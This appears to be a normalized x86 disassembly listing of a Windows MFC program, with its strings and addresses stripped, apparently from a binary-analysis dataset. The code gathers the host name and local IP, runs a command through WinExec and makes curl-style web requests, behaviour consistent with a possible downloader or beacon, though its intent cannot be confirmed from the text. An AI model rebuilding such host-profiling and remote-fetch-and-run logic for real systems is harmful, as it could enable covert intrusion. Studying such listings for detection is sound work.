sub_401000
push 0xffffffff
push sub_40d55a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push 0x754
call Ordinal_MFC42_823
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je r-xdata
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx eax
call sub_4010a0
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4010a0
push 0xffffffff
push sub_40d5ae
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x104
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call Ordinal_MFC42_366
lea ecx [ esi + 0x620 ]
mov [ esp + 0x110 ] 0x0
call Ordinal_MFC42_540
lea ecx [ esi + 0x634 ]
mov [ esp + 0x110 ] 0x1
call Ordinal_MFC42_529
lea ecx [ esi + 0x6b4 ]
mov [ esp + 0x110 ] 0x2
call Ordinal_MFC42_554
mov ecx esi
mov [ esp + 0x110 ] 0x3
mov [ esi ] r--data
call sub_401f40
mov eax [ esi + 0x624 ]
test eax eax
je r-xdata
lea eax [ esi + 0x314 ]
push rw-data
push eax
lea ecx [ esp + 0x10 ]
push rw-data
push ecx
call [ sprintf@IAT ]
lea edx [ esp + 0x18 ]
push 0x0
push edx
call [ _access@IAT ]
add esp 0x18
cmp eax 0xffffffff
mov [ esi + 0x630 ] 0x1
mov ecx esi
jne r-xdata
mov ecx esi
call sub_403630
jmp r-xdata
call sub_401890
mov ecx esi
mov [ esi + 0x630 ] 0x0
call sub_4012e0
call sub_4012e0
mov ecx esi
mov [ esi + 0x630 ] 0x0
call sub_401890
jmp r-xdata
mov ecx [ esp + 0x108 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x110
retn
sub_4011d0
push 0xffffffff
push sub_40d5e4
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
lea ecx [ esi + 0x6b4 ]
mov [ esp + 0x10 ] 0x2
call Ordinal_MFC42_807
lea ecx [ esi + 0x634 ]
mov [ esp + 0x10 ] 0x1
call Ordinal_MFC42_796
lea ecx [ esi + 0x620 ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_800
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call Ordinal_MFC42_674
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_401250
mov eax [ esp + 0x4 ]
push eax
call Ordinal_MFC42_4457
cmp eax 0xffffffff
jne r-xdata
push esi
push rw-data
call [ GetModuleHandleA@IAT ]
mov esi eax
test esi esi
je r-xdata
or eax eax
retn 0x4
mov ecx rw-data
call sub_403e40
xor eax eax
pop esi
retn 0x4
push rw-data
push esi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push esi
call [ FreeLibrary@IAT ]
push 0x1
push 0x0
call eax
sub_4012b0
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi ecx
mov eax [ esi + 0x20 ]
push esi
and ah 0x7f
mov [ esi + 0x20 ] eax
call Ordinal_MFC42_5252
test eax eax
jne r-xdata
push esi
mov ecx edi
call Ordinal_MFC42_5252
pop edi
pop esi
retn 0x4
pop edi
pop esi
retn 0x4
sub_4012e0
push 0xffffffff
push sub_40d6b6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x94
push ebx
push ebp
push esi
mov ebp ecx
push edi
push rw-data
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_537
push rw-data
lea ecx [ esp + 0x20 ]
mov [ esp + 0xb0 ] 0x0
call Ordinal_MFC42_537
push rw-data
lea ecx [ esp + 0x24 ]
mov [ esp + 0xb0 ] 0x1
call Ordinal_MFC42_537
mov bl 0x2
mov ecx ebp
mov [ esp + 0xac ] bl
call sub_402170
lea eax [ ebp + 0x314 ]
push eax
call [ SetCurrentDirectoryA@IAT ]
lea ecx [ esp + 0x24 ]
push 0x55
push ecx
push rw-data
call sub_402ed0
add esp 0xc
lea edx [ esp + 0x24 ]
push 0x1
push edx
call [ WinExec@IAT ]
mov esi [ gethostbyname@IAT ]
push rw-data
call esi
test eax eax
je r-xdata
mov eax [ ebp + 0x630 ]
mov edi rw-data
test eax eax
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x24 ]
mov eax ecx
mov esi edi
mov edi edx
push rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x28 ]
push ecx
mov ecx ebp
call sub_403700
lea edx [ esp + 0x24 ]
lea eax [ esp + 0x10 ]
push edx
lea ecx [ esp + 0x18 ]
push eax
push ecx
call Ordinal_MFC42_924
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0xb0 ] 0x3
call Ordinal_MFC42_858
lea ecx [ esp + 0x14 ]
mov [ esp + 0xac ] bl
call Ordinal_MFC42_800
lea eax [ ebp + 0x110 ]
lea edx [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
push edx
push eax
call Ordinal_MFC42_924
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0xb0 ] 0x4
call Ordinal_MFC42_858
lea ecx [ esp + 0x14 ]
mov [ esp + 0xac ] bl
call Ordinal_MFC42_800
mov eax [ ebp + 0x630 ]
mov edi rw-data
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x24 ]
mov eax ecx
mov esi edi
mov edi edx
push rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x28 ]
push ecx
mov ecx ebp
call sub_403700
lea edx [ esp + 0x24 ]
lea ecx [ esp + 0x1c ]
push edx
call Ordinal_MFC42_860
lea eax [ ebp + 0x110 ]
lea ecx [ esp + 0x14 ]
push eax
lea eax [ esp + 0x20 ]
push eax
push ecx
call Ordinal_MFC42_924
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0xb0 ] 0x5
call Ordinal_MFC42_858
lea ecx [ esp + 0x14 ]
mov [ esp + 0xac ] bl
call Ordinal_MFC42_800
mov edx [ esp + 0x10 ]
mov ecx ebp
push edx
call sub_401f10
lea eax [ ebp + 0xd0 ]
lea ecx [ esp + 0x14 ]
push eax
call Ordinal_MFC42_537
push eax
lea ecx [ esp + 0x24 ]
mov [ esp + 0xb0 ] 0x6
call Ordinal_MFC42_858
lea ecx [ esp + 0x14 ]
mov [ esp + 0xac ] bl
call Ordinal_MFC42_800
push 0x5f
push 0x2e
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_6876
lea ecx [ esp + 0x10 ]
push rw-data
lea edx [ esp + 0x18 ]
push ecx
push edx
call Ordinal_MFC42_924
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0xb0 ] 0x7
call Ordinal_MFC42_858
lea ecx [ esp + 0x14 ]
mov [ esp + 0xac ] bl
call Ordinal_MFC42_800
lea eax [ esp + 0x20 ]
lea ecx [ esp + 0x10 ]
push eax
lea edx [ esp + 0x18 ]
push ecx
push edx
call Ordinal_MFC42_922
mov [ esp + 0xac ] 0x8
push eax
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_858
lea ecx [ esp + 0x14 ]
mov [ esp + 0xac ] bl
call Ordinal_MFC42_800
lea eax [ esp + 0x1c ]
push rw-data
lea ecx [ esp + 0x1c ]
push eax
push ecx
call Ordinal_MFC42_924
lea edx [ esp + 0x20 ]
mov [ esp + 0xac ] 0x9
push edx
push eax
lea eax [ esp + 0x1c ]
push eax
call Ordinal_MFC42_922
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0xb0 ] 0xa
call Ordinal_MFC42_858
lea ecx [ esp + 0x14 ]
mov [ esp + 0xac ] 0x9
call Ordinal_MFC42_800
lea ecx [ esp + 0x18 ]
mov [ esp + 0xac ] bl
call Ordinal_MFC42_800
mov edi [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
lea edx [ ebp + 0x190 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x10 ]
push ecx
mov ecx ebp
call sub_401f10
mov ecx ebp
call sub_4023a0
mov eax [ ebp + 0x630 ]
mov edi rw-data
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x24 ]
mov eax ecx
mov esi edi
mov edi edx
push rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x28 ]
push ecx
mov ecx ebp
call sub_403700
lea edx [ esp + 0x24 ]
lea ecx [ esp + 0x10 ]
push edx
call Ordinal_MFC42_860
lea eax [ ebp + 0x110 ]
lea ecx [ esp + 0x14 ]
push eax
call Ordinal_MFC42_537
push eax
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x1c ]
push eax
push ecx
mov [ esp + 0xb8 ] 0xb
call Ordinal_MFC42_922
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0xb0 ] 0xc
call Ordinal_MFC42_858
lea ecx [ esp + 0x18 ]
mov [ esp + 0xac ] 0xb
call Ordinal_MFC42_800
lea ecx [ esp + 0x14 ]
mov [ esp + 0xac ] bl
call Ordinal_MFC42_800
lea edx [ esp + 0x10 ]
push rw-data
lea eax [ esp + 0x1c ]
push edx
push eax
call Ordinal_MFC42_924
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0xb0 ] 0xd
call Ordinal_MFC42_858
lea ecx [ esp + 0x18 ]
mov [ esp + 0xac ] bl
call Ordinal_MFC42_800
mov ecx [ esp + 0x10 ]
push ecx
push rw-data
mov ecx ebp
call sub_401e60
mov eax [ ebp + 0x630 ]
mov edi rw-data
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x24 ]
mov eax ecx
mov esi edi
mov edi edx
push rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x28 ]
push ecx
mov ecx ebp
call sub_403700
lea edx [ esp + 0x24 ]
lea ecx [ esp + 0x10 ]
push edx
call Ordinal_MFC42_860
lea eax [ ebp + 0x110 ]
lea ecx [ esp + 0x14 ]
push eax
call Ordinal_MFC42_537
push eax
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x1c ]
push eax
push ecx
mov [ esp + 0xb8 ] 0xe
call Ordinal_MFC42_922
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0xb0 ] 0xf
call Ordinal_MFC42_858
lea ecx [ esp + 0x18 ]
mov [ esp + 0xac ] 0xe
call Ordinal_MFC42_800
lea ecx [ esp + 0x14 ]
mov [ esp + 0xac ] bl
call Ordinal_MFC42_800
lea edx [ esp + 0x10 ]
push rw-data
lea eax [ esp + 0x1c ]
push edx
push eax
call Ordinal_MFC42_924
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0xb0 ] 0x10
call Ordinal_MFC42_858
lea ecx [ esp + 0x18 ]
mov [ esp + 0xac ] bl
call Ordinal_MFC42_800
lea ecx [ esp + 0x10 ]
push rw-data
lea edx [ esp + 0x1c ]
push ecx
push edx
call Ordinal_MFC42_924
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0xb0 ] 0x11
call Ordinal_MFC42_858
lea ecx [ esp + 0x18 ]
mov [ esp + 0xac ] bl
call Ordinal_MFC42_800
mov eax [ esp + 0x10 ]
mov ecx ebp
push eax
call sub_402bd0
lea ecx [ esp + 0x20 ]
mov [ esp + 0xac ] 0x1
call Ordinal_MFC42_800
lea ecx [ esp + 0x1c ]
mov [ esp + 0xac ] 0x0
call Ordinal_MFC42_800
lea ecx [ esp + 0x10 ]
mov [ esp + 0xac ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0xa4 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0xa0
retn
mov edi rw-data
sub_401890
push 0xffffffff
push sub_40d74f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x94
push ebx
push ebp
push esi
mov ebp ecx
push edi
push rw-data
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_537
push rw-data
lea ecx [ esp + 0x20 ]
mov [ esp + 0xb0 ] 0x0
call Ordinal_MFC42_537
push rw-data
lea ecx [ esp + 0x24 ]
mov [ esp + 0xb0 ] 0x1
call Ordinal_MFC42_537
mov ecx ebp
mov [ esp + 0xac ] 0x2
call sub_402170
lea eax [ ebp + 0x314 ]
push eax
call [ SetCurrentDirectoryA@IAT ]
mov esi [ gethostbyname@IAT ]
push rw-data
call esi
test eax eax
je r-xdata
mov eax [ ebp + 0x630 ]
mov edi rw-data
test eax eax
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x24 ]
mov eax ecx
mov esi edi
mov edi edx
push rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x28 ]
push ecx
mov ecx ebp
call sub_403700
lea edx [ esp + 0x24 ]
lea eax [ esp + 0x10 ]
push edx
lea ecx [ esp + 0x18 ]
push eax
push ecx
call Ordinal_MFC42_924
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0xb0 ] 0x3
call Ordinal_MFC42_858
lea ecx [ esp + 0x14 ]
mov [ esp + 0xac ] 0x2
call Ordinal_MFC42_800
lea ebx [ ebp + 0x110 ]
lea edx [ esp + 0x10 ]
push ebx
lea eax [ esp + 0x18 ]
push edx
push eax
call Ordinal_MFC42_924
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0xb0 ] 0x4
call Ordinal_MFC42_858
lea ecx [ esp + 0x14 ]
mov [ esp + 0xac ] 0x2
call Ordinal_MFC42_800
mov eax [ ebp + 0x630 ]
mov edi rw-data
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x24 ]
mov eax ecx
mov esi edi
mov edi edx
push rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x28 ]
push ecx
mov ecx ebp
call sub_403700
lea edx [ esp + 0x24 ]
lea ecx [ esp + 0x1c ]
push edx
call Ordinal_MFC42_860
lea eax [ esp + 0x1c ]
push ebx
lea ecx [ esp + 0x18 ]
push eax
push ecx
call Ordinal_MFC42_924
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0xb0 ] 0x5
call Ordinal_MFC42_858
lea ecx [ esp + 0x14 ]
mov [ esp + 0xac ] 0x2
call Ordinal_MFC42_800
mov edx [ esp + 0x10 ]
mov ecx ebp
push edx
call sub_401f10
mov eax [ ebp + 0x630 ]
mov edi rw-data
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x24 ]
mov eax ecx
mov esi edi
mov edi edx
push rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x28 ]
push ecx
mov ecx ebp
call sub_403700
lea edx [ esp + 0x24 ]
lea ecx [ esp + 0x10 ]
push edx
call Ordinal_MFC42_860
push ebx
lea ecx [ esp + 0x1c ]
call Ordinal_MFC42_537
push eax
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x18 ]
push eax
push ecx
mov [ esp + 0xb8 ] 0x6
call Ordinal_MFC42_922
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0xb0 ] 0x7
call Ordinal_MFC42_858
lea ecx [ esp + 0x14 ]
mov [ esp + 0xac ] 0x6
call Ordinal_MFC42_800
lea ecx [ esp + 0x18 ]
mov [ esp + 0xac ] 0x2
call Ordinal_MFC42_800
lea edx [ esp + 0x10 ]
push rw-data
lea eax [ esp + 0x1c ]
push edx
push eax
call Ordinal_MFC42_924
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0xb0 ] 0x8
call Ordinal_MFC42_858
lea ecx [ esp + 0x18 ]
mov [ esp + 0xac ] 0x2
call Ordinal_MFC42_800
mov ecx [ esp + 0x10 ]
push ecx
push rw-data
mov ecx ebp
call sub_401e60
mov eax [ ebp + 0x630 ]
mov edi rw-data
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x24 ]
mov eax ecx
mov esi edi
mov edi edx
push rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x28 ]
push ecx
mov ecx ebp
call sub_403700
lea edx [ esp + 0x24 ]
lea ecx [ esp + 0x10 ]
push edx
call Ordinal_MFC42_860
push ebx
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_537
push eax
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x1c ]
mov bl 0x9
push eax
push ecx
mov [ esp + 0xb8 ] bl
call Ordinal_MFC42_922
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0xb0 ] 0xa
call Ordinal_MFC42_858
lea ecx [ esp + 0x18 ]
mov [ esp + 0xac ] bl
call Ordinal_MFC42_800
lea ecx [ esp + 0x14 ]
mov [ esp + 0xac ] 0x2
call Ordinal_MFC42_800
lea edx [ esp + 0x10 ]
push rw-data
lea eax [ esp + 0x1c ]
push edx
push eax
call Ordinal_MFC42_924
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0xb0 ] 0xb
call Ordinal_MFC42_858
lea ecx [ esp + 0x18 ]
mov [ esp + 0xac ] 0x2
call Ordinal_MFC42_800
lea ecx [ esp + 0x10 ]
push rw-data
lea edx [ esp + 0x1c ]
push ecx
push edx
call Ordinal_MFC42_924
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0xb0 ] 0xc
call Ordinal_MFC42_858
lea ecx [ esp + 0x18 ]
mov [ esp + 0xac ] 0x2
call Ordinal_MFC42_800
mov eax [ esp + 0x10 ]
mov ecx ebp
push eax
call sub_402bd0
lea ecx [ esp + 0x20 ]
mov [ esp + 0xac ] 0x1
call Ordinal_MFC42_800
lea ecx [ esp + 0x1c ]
mov [ esp + 0xac ] 0x0
call Ordinal_MFC42_800
lea ecx [ esp + 0x10 ]
mov [ esp + 0xac ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0xa4 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0xa0
retn
mov edi rw-data
sub_401d00
sub esp 0x94
mov eax [ rw-data ]
push ebx
push ebp
mov ebp ecx
mov ecx [ rw-data ]
push esi
xor esi esi
push 0x3
mov [ esp + 0x10 ] esi
mov [ esp + 0x14 ] esi
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] ecx
call sub_403e50
mov edx [ esp + 0xac ]
add esp 0x4
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0xc ]
push 0x11
push edx
push 0xa
push rw-data
push 0x1
push eax
push ecx
call sub_404200
mov edx [ esp + 0xc0 ]
add esp 0x1c
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0xc ]
push 0x11
push edx
push 0x4
push rw-data
push 0x1
push eax
push ecx
call sub_404200
add esp 0x1c
lea edx [ esp + 0x10 ]
lea eax [ esp + 0xc ]
push 0x11
push rw-data
push 0x4
push rw-data
push 0x1
push edx
push eax
call sub_404200
call sub_403ee0
lea ecx [ esp + 0x34 ]
mov ebx eax
push ecx
push esi
call sub_404020
add esp 0x24
cmp ebx esi
mov [ esp + 0x14 ] eax
je r-xdata
pop esi
pop ebp
pop ebx
add esp 0x94
retn 0x8
mov eax [ ebp + 0x630 ]
push edi
cmp eax esi
mov edi rw-data
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x24 ]
mov eax ecx
mov esi edi
mov edi edx
push rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x28 ]
push ecx
mov ecx ebp
call sub_403700
lea edx [ esp + 0x24 ]
push edx
push 0x2712
push ebx
call sub_403f20
mov eax [ esp + 0x1c ]
add esp 0xc
push eax
push 0x2728
push ebx
call sub_403f20
push ebx
call sub_403f70
push ebx
call sub_403fe0
mov ecx [ esp + 0x24 ]
push ecx
call sub_4047b0
mov edx [ esp + 0x30 ]
push edx
call sub_4040a0
add esp 0x1c
pop edi
mov edi rw-data
sub_401e60
mov eax [ esp + 0x4 ]
sub esp 0x8
push rw-data
push eax
call [ fopen@IAT ]
xor ecx ecx
add esp 0x8
cmp eax ecx
mov [ rw-data ] eax
jne r-xdata
push esi
push edi
push 0x3
mov [ esp + 0xc ] ecx
mov [ esp + 0x10 ] ecx
call sub_403e50
add esp 0x4
call sub_403ee0
mov ecx [ esp + 0x18 ]
mov esi eax
push ecx
push 0x2712
push esi
call sub_403f20
add esp 0xc
push sub_401cd0
push 0x4e2b
push esi
call sub_403f20
add esp 0xc
lea edx [ esp + 0x8 ]
push edx
push 0x2711
push esi
call sub_403f20
push esi
call sub_403f70
push esi
mov edi eax
call sub_403fe0
mov eax [ rw-data ]
push eax
call [ fclose@IAT ]
add esp 0x18
mov eax edi
neg eax
pop edi
pop esi
sbb eax eax
add esp 0x8
retn 0x8
or eax 0xffffffff
add esp 0x8
retn 0x8
sub_401f10
push esi
call sub_403ee0
mov esi eax
test esi esi
je r-xdata
pop esi
retn 0x4
mov eax [ esp + 0x8 ]
push eax
push 0x2712
push esi
call sub_403f20
push esi
call sub_403f70
push esi
call sub_403fe0
add esp 0x14
sub_401f40
sub esp 0x104
push ebx
push esi
mov ebx ecx
call sub_401fd0
test eax eax
jne r-xdata
lea esi [ ebx + 0x210 ]
push 0x104
push esi
call [ GetSystemDirectoryA@IAT ]
mov ecx ebx
call sub_402f10
test eax eax
je r-xdata
push edi
mov edi rw-data
or ecx 0xffffffff
lea edx [ ebx + 0xc0 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
push 0x0
lea ecx [ esp + 0xc ]
push 0x1a
push ecx
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
lea edx [ esp + 0x8 ]
push edx
push esi
jmp r-xdata
add ebx 0x314
push rw-data
push ebx
call [ sprintf@IAT ]
add esp 0xc
pop esi
pop ebx
add esp 0x104
retn
sub_401fd0
sub esp 0x9c
push ebx
push esi
mov esi [ GetVersionExA@IAT ]
mov ebx ecx
push edi
mov ecx 0x27
xor eax eax
lea edi [ esp + 0xc ]
[ edi ]
lea eax [ esp + 0xc ]
mov [ esp + 0xc ] 0x9c
push eax
call esi
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
xor edx edx
sub eax edx
push ebp
je r-xdata
lea ecx [ esp + 0xc ]
mov [ esp + 0xc ] 0x94
push ecx
call esi
test eax eax
jne r-xdata
lea ebp [ ebx + 0xc0 ]
mov edi rw-data
dec eax
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x9c
retn
cmp [ esp + 0x14 ] 0x4
jne r-xdata
dec eax
je r-xdata
lea ebp [ ebx + 0xc0 ]
mov edi rw-data
jmp r-xdata
mov eax [ esp + 0x18 ]
cmp eax edx
jne r-xdata
mov eax [ esp + 0x14 ]
cmp eax 0x4
ja r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebp
pop ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax 0x1
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov [ ebx + 0x624 ] edx
pop esi
pop ebx
add esp 0x9c
retn
cmp eax 0xa
jne r-xdata
lea ebp [ ebx + 0xc0 ]
mov edi rw-data
jmp r-xdata
cmp eax 0x5
jne r-xdata
lea edx [ ebx + 0xc0 ]
mov edi rw-data
jmp r-xdata
cmp eax 0x5a
jne r-xdata
lea ebp [ ebx + 0xc0 ]
mov edi rw-data
jmp r-xdata
lea edx [ ebx + 0xc0 ]
mov edi rw-data
mov eax [ esp + 0x18 ]
cmp eax edx
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
pop ebp
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax 0x1
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov [ ebx + 0x624 ] 0x1
pop esi
pop ebx
add esp 0x9c
retn
lea ebp [ ebx + 0xc0 ]
mov edi rw-data
jmp r-xdata
cmp eax 0x1
jne r-xdata
lea edx [ ebx + 0xc0 ]
mov edi rw-data
jmp r-xdata
cmp eax 0x2
jne r-xdata
lea edx [ ebx + 0xc0 ]
mov edi rw-data
jmp r-xdata
lea edx [ ebx + 0xc0 ]
mov edi rw-data
jmp r-xdata
sub_402170
sub esp 0x1a0
lea eax [ esp + 0x10 ]
push ebx
push ebp
push esi
push edi
push eax
mov ebx ecx
push 0x101
call [ WSAStartup@IAT ]
test eax eax
je r-xdata
lea ecx [ esp + 0x10 ]
push ecx
call [ GetLocalTime@IAT ]
mov edx [ esp + 0x1a ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x16 ]
and edx 0xffff
push edx
mov edx [ esp + 0x16 ]
and eax 0xffff
and ecx 0xffff
push eax
and edx 0xffff
push ecx
push edx
lea eax [ ebx + 0x620 ]
push rw-data
push eax
call Ordinal_MFC42_2818
add esp 0x18
lea ebp [ ebx + 0x110 ]
push 0x32
push ebp
call [ gethostname@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x1a0
retn
push ebp
call [ gethostbyname@IAT ]
mov esi eax
mov edi [ inet_ntoa@IAT ]
mov ecx [ esi + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
push eax
call edi
mov ebp [ lstrcpyA@IAT ]
push eax
lea eax [ ebx + 0xd0 ]
push eax
call ebp
mov ecx [ esi + 0xc ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ ebx + 0xd0 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
xor eax eax
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1a0
retn
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ ebx + 0xf0 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax 0x1
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1a0
retn
mov eax [ eax ]
push eax
call edi
add ebx 0xf0
push eax
push ebx
call ebp
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x1a0
retn
sub_4022e0
sub esp 0x10
lea eax [ esp ]
push ebx
push esi
push edi
mov esi ecx
push eax
call [ GetLocalTime@IAT ]
mov ecx [ esp + 0x16 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x12 ]
and ecx 0xffff
push ecx
mov ecx [ esp + 0x12 ]
and edx 0xffff
and eax 0xffff
push edx
and ecx 0xffff
push eax
push ecx
lea edx [ esi + 0x620 ]
push rw-data
push edx
call Ordinal_MFC42_2818
add esp 0x18
mov ebx [ GetPrivateProfileStringA@IAT ]
lea edi [ esi + 0x418 ]
lea eax [ esi + 0x110 ]
push edi
push 0x80
push eax
push rw-data
push rw-data
push rw-data
call ebx
push edi
lea ecx [ esi + 0xd0 ]
push 0x20
push ecx
push rw-data
push rw-data
push rw-data
call ebx
push edi
add esi 0xf0
push 0x20
push esi
push rw-data
push rw-data
push rw-data
call ebx
pop edi
pop esi
pop ebx
add esp 0x10
retn
sub_4023a0
push ebp
mov ebp esp
push 0xffffffff
push sub_40d770
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24c
push ebx
push esi
mov ebx ecx
push edi
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x20 ] ebx
call Ordinal_MFC42_354
mov ecx ebx
mov [ ebp - 0x4 ] 0x0
call sub_402610
lea edi [ ebx + 0x314 ]
or ecx 0xffffffff
xor eax eax
mov [ ebp - 0x1c ] edi
[ edi ]
not ecx
sub edi ecx
lea edx [ ebp - 0x118 ]
mov eax ecx
mov esi edi
mov edi edx
lea edx [ ebp - 0x118 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push rw-data
